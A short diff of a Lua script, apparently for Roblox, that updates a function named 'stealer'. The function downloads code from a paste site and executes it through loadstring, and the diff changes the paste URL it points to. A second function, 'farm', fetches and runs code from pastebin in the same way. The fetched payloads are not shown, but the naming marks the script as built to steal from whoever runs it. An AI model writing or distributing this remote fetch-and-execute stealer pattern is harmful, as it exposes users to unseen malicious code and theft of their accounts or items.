@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("http://vpaste.net/R1X6Z", true))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/fd0575b5/", true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://pastebin.com/raw/Ea2fXndi"))()
